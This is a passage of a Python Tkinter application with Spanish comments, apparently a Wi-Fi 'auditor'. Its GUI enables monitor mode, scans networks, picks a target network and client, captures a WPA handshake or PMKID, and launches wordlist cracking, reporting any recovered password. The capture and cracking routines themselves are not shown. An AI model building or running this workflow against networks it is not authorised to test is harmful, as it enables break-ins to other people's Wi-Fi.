            self.scan_btn.config(state=tk.DISABLED)
            self.start_attack_btn.config(state=tk.DISABLED)

    def toggle_monitor_mode(self):
        """Activa/desactiva el modo monitor para la interfaz seleccionada."""
        if not self.interface:
            self.log_queue.put("[!] No hay interfaz seleccionada.")
            messagebox.showwarning("Advertencia", "Por favor, detecta una interfaz primero.")
            return

        if self.monitor_interface: # Si ya está en modo monitor
            # Desactivar
            self.monitor_mode_btn.config(state=tk.DISABLED, text="Desactivando...")
            self.log_queue.put(f"[*] Desactivando el modo monitor en {self.monitor_interface}...")
            # Ejecutar en un hilo para no bloquear la GUI
            threading.Thread(target=self._stop_monitor_mode_and_update_gui, args=(self.monitor_interface,)).start()
        else: # Activar
            self.monitor_mode_btn.config(state=tk.DISABLED, text="Activando...")
            self.log_queue.put(f"[*] Activando el modo monitor en {self.interface}...")
            # Ejecutar en un hilo
            threading.Thread(target=self._set_monitor_mode_and_update_gui, args=(self.interface,)).start()

    def _set_monitor_mode_and_update_gui(self, original_interface):
        """Función auxiliar para activar modo monitor en un hilo y actualizar GUI."""
        new_monitor_interface = set_monitor_mode(original_interface, self.log_queue)
        if new_monitor_interface:
            self.monitor_interface = new_monitor_interface
            self.interface_var.set(f"{self.monitor_interface} (Modo Monitor ACTIVO)")
            self.scan_btn.config(state=tk.NORMAL)
            self.monitor_mode_btn.config(text="Desactivar Modo Monitor", state=tk.NORMAL)
            self.log_queue.put("[+] Modo Monitor activado con éxito.")
        else:
            self.monitor_interface = None
            self.interface_var.set(f"{original_interface} (Falló Modo Monitor)")
            self.scan_btn.config(state=tk.DISABLED)
            self.monitor_mode_btn.config(text="Activar Modo Monitor", state=tk.NORMAL)
            self.log_queue.put("[!] Falló la activación del Modo Monitor.")

    def _stop_monitor_mode_and_update_gui(self, mon_interface):
        """Función auxiliar para desactivar modo monitor en un hilo y actualizar GUI."""
        stop_monitor_mode(mon_interface, self.log_queue)
        self.monitor_interface = None
        self.interface_var.set(f"{self.interface} (No en modo monitor)")
        self.monitor_mode_btn.config(text="Activar Modo Monitor", state=tk.NORMAL)
        self.scan_btn.config(state=tk.DISABLED)
        self.start_attack_btn.config(state=tk.DISABLED) # Deshabilita el botón de ataque
        self.log_queue.put("[+] Modo Monitor desactivado con éxito.")


    def start_scan(self):
        """Inicia el escaneo de redes en un hilo separado."""
        if not self.monitor_interface:
            self.log_queue.put("[!] El modo monitor no está activado.")
            messagebox.showwarning("Advertencia", "Por favor, activa el modo monitor primero.")
            return

        # Limpiar Treeview antes de escanear
        for i in self.networks_tree.get_children():
            self.networks_tree.delete(i)
        self.networks = []
        self.selected_network_bssid = None
        self.selected_network_essid = None
        self.selected_network_channel = None
        self.selected_client_mac = None
        self.selected_network_var.set("")
        self.start_attack_btn.config(state=tk.DISABLED)

        self.scan_btn.config(state=tk.DISABLED, text="Escaneando...")
        self.stop_event.clear() # Limpiar el evento de parada
        self.scan_thread = threading.Thread(target=self._run_scan_and_update_gui)
        self.scan_thread.daemon = True # Permite que el programa se cierre aunque el hilo siga corriendo
        self.scan_thread.start()

    def _run_scan_and_update_gui(self):
        """Ejecuta el escaneo en el hilo y actualiza la GUI."""
        scanned_networks = scan_networks(self.monitor_interface, self.log_queue, self.stop_event)
        self.networks = scanned_networks
        self.master.after(0, self._update_networks_treeview) # Actualizar GUI en el hilo principal
        self.master.after(0, lambda: self.scan_btn.config(state=tk.NORMAL, text="Iniciar Escaneo"))

    def _update_networks_treeview(self):
        """Actualiza el Treeview de redes con los resultados del escaneo."""
        for i in self.networks_tree.get_children():
            self.networks_tree.delete(i)
        
        if not self.networks:
            self.log_queue.put("[*] No se encontraron redes durante el escaneo.")
            return

        for net in self.networks:
            # Join clients for display
            clients_str = ", ".join(net["Clients"]) if net["Clients"] else "N/A"
            self.networks_tree.insert("", tk.END, values=(net["BSSID"], net["ESSID"], net["Channel"], net["Encryption"], clients_str))
        self.log_queue.put(f"[+] {len(self.networks)} redes cargadas en la tabla.")

    def on_network_select(self, event):
        """Maneja la selección de una red en el Treeview."""
        selected_item = self.networks_tree.focus()
        if selected_item:
            values = self.networks_tree.item(selected_item, 'values')
            self.selected_network_bssid = values[0]
            self.selected_network_essid = values[1]
            self.selected_network_channel = values[2]
            
            # Limpiar el campo de cliente si se selecciona una nueva red
            self.client_mac_entry.delete(0, tk.END)

            # Si hay clientes en la red, sugerir el primero
            if self.networks:
                for net in self.networks:
                    if net["BSSID"] == self.selected_network_bssid:
                        if net["Clients"]:
                            self.client_mac_entry.insert(0, net["Clients"][0])
                            self.selected_client_mac = net["Clients"][0]
                        else:
                            self.selected_client_mac = None
                        break

            self.selected_network_var.set(f"{self.selected_network_essid} ({self.selected_network_bssid}) Canal: {self.selected_network_channel}")
            self.start_attack_btn.config(state=tk.NORMAL)
        else:
            self.selected_network_bssid = None
            self.selected_network_essid = None
            self.selected_network_channel = None
            self.selected_client_mac = None
            self.selected_network_var.set("")
            self.client_mac_entry.delete(0, tk.END)
            self.start_attack_btn.config(state=tk.DISABLED)

    def browse_wordlist(self):
        """Abre un diálogo para seleccionar el archivo de wordlist."""
        filepath = filedialog.askopenfilename(
            title="Seleccionar Wordlist",
            filetypes=(("Archivos de texto", "*.txt"), ("Todos los archivos", "*.*"))
        )
        if filepath:
            self.wordlist_path_var.set(filepath)
            self.log_queue.put(f"[*] Wordlist seleccionada: {filepath}")

    def start_attack(self):
        """Inicia el proceso de captura y descifrado en un hilo separado."""
        if not self.monitor_interface or not self.selected_network_bssid or not self.wordlist_path_var.get():
            self.log_queue.put("[!] Por favor, selecciona una interfaz, una red y una wordlist.")
            messagebox.showwarning("Advertencia", "Asegúrate de que la interfaz esté en modo monitor, hayas seleccionado una red y una wordlist.")
            return

        self.log_queue.put(f"[*] Iniciando ataque contra {self.selected_network_essid} ({self.selected_network_bssid})...")
        self.start_attack_btn.config(state=tk.DISABLED, text="Ataque en Curso...")
        self.stop_attack_btn.config(state=tk.NORMAL)
        self.scan_btn.config(state=tk.DISABLED)
        self.monitor_mode_btn.config(state=tk.DISABLED)

        self.stop_event.clear()
        self.attack_start_time = time.time()
        self.update_timer() # Inicia el temporizador de tiempo transcurrido

        # Obtener el cliente MAC si se ingresó
        target_client = self.client_mac_entry.get().strip()
        if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', target_client) and target_client != "":
            self.log_queue.put("[!] Advertencia: La MAC del cliente no parece válida. Continuaré sin desautenticación específica.")
            target_client = None # Reset if invalid
        elif target_client == "":
            target_client = None

        self.attack_thread = threading.Thread(target=self._run_attack_and_update_gui, 
                                              args=(self.monitor_interface, self.selected_network_bssid, 
                                                    self.selected_network_channel, self.selected_network_essid, 
                                                    target_client, self.wordlist_path_var.get(), 
                                                    self.crack_method_var.get()))
        self.attack_thread.daemon = True
        self.attack_thread.start()

    def _run_attack_and_update_gui(self, interface, bssid, channel, essid, target_client, wordlist, crack_method):
        """Ejecuta la lógica de ataque en un hilo y actualiza la GUI."""
        captured_file = capture_handshake_or_pmkid(interface, bssid, channel, essid, target_client, self.log_queue, self.stop_event)
        
        if self.stop_event.is_set():
            self.log_queue.put("[*] Ataque cancelado durante la fase de captura.")
            self.master.after(0, self._reset_gui_after_attack)
            return

        if captured_file:
            self.log_queue.put(f"[+] Archivo de captura listo: {captured_file}. Iniciando descifrado...")
            password = crack_handshake(captured_file, wordlist, crack_method, self.log_queue, self.stop_event)
            if password:
                messagebox.showinfo("¡Éxito!", f"¡Contraseña encontrada: {password} para {essid}!")
                self.log_queue.put(f"[+] Contraseña encontrada: {password} para {essid}")
            else:
                self.log_queue.put("[!] No se pudo descifrar la contraseña.")
        else:
            self.log_queue.put("[!] No se pudo obtener un handshake/PMKID válido. Ataque detenido.")
        
        self.master.after(0, self._reset_gui_after_attack) # Restablecer GUI en el hilo principal

    def stop_attack(self):
        """Envía una señal para detener el ataque."""
        self.log_queue.put("[*] Recibida señal de detener ataque. Finalizando procesos...")
        self.stop_event.set() # Establecer el evento para que los hilos sepan que deben detenerse
        self._reset_gui_after_attack()

    def _reset_gui_after_attack(self):
        """Restablece los botones y el estado de la GUI después de un ataque."""
        if self.update_timer_id:
            self.master.after_cancel(self.update_timer_id)
            self.update_timer_id = None
        self.attack_start_time = None
        self.elapsed_time.set("00:00:00")

        self.start_attack_btn.config(state=tk.NORMAL, text="Iniciar Ataque")
        self.stop_attack_btn.config(state=tk.DISABLED)
        
        if self.monitor_interface: # Si el modo monitor está activo
            self.scan_btn.config(state=tk.NORMAL)
            self.monitor_mode_btn.config(state=tk.NORMAL)
        else: # Si no lo está (quizás nunca se activó o se desactivó)
             self.scan_btn.config(state=tk.DISABLED)
             self.monitor_mode_btn.config(state=tk.NORMAL) # O al menos intenta reactivarlo si es posible

        # Limpiar archivos temporales (opcional, pero buena práctica)
        temp_files = ["scan_result-01.csv", "capture-01.cap", "pmkid_capture.pcapng", 
                      "pmkid_hash.hc22000", "filter.txt", "capture-01.hccapx", 
                      "airodump.log", "hcxdumptool.log"] # Agrega otros archivos temporales si los creas
        for f in temp_files:
            if os.path.exists(f):
                try:
                    os.remove(f)
                    self.log_queue.put(f"[*] Archivo temporal '{f}' eliminado.")
                except OSError as e:
                    self.log_queue.put(f"[!] Advertencia: No se pudo eliminar el archivo temporal '{f}': {e}")


    def on_closing(self):
        """Maneja el cierre de la ventana, asegurando que los hilos se detengan."""
        if messagebox.askokcancel("Salir", "¿Estás seguro de que quieres salir? Esto detendrá cualquier ataque en curso y restaurará la interfaz."):
            self.stop_attack() # Enviar señal de parada a los hilos activos
            
            # Dar tiempo a los hilos para terminar, o usar un apagado más robusto
            if self.attack_thread and self.attack_thread.is_alive():
                self.attack_thread.join(timeout=5) # Esperar a que el hilo termine por hasta 5 segundos
            if self.scan_thread and self.scan_thread.is_alive():
                self.scan_thread.join(timeout=5)
            
            # Asegurarse de que el modo monitor esté desactivado si se encontró una interfaz
            if self.monitor_interface: # Usar self.monitor_interface para la interfaz en modo monitor
                stop_monitor_mode(self.monitor_interface, self.log_queue) # Asegurarse de que esté explícitamente apagado
            elif self.interface and self.interface_var.get() != "No detectada": # Si la interfaz original fue detectada y no es 'No detectada'
                 # Intentar apagar el modo monitor por si acaso airmon-ng start cambió el nombre
                 # Esto es un poco redundante si se usa self.monitor_interface, pero más seguro
                 self.log_queue.put(f"[*] Intentando restaurar la interfaz original {self.interface} por si acaso...")
                 stop_monitor_mode(self.interface, self.log_queue)

            self.master.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    app = WiFiAuditorApp(root)
    root.mainloop()
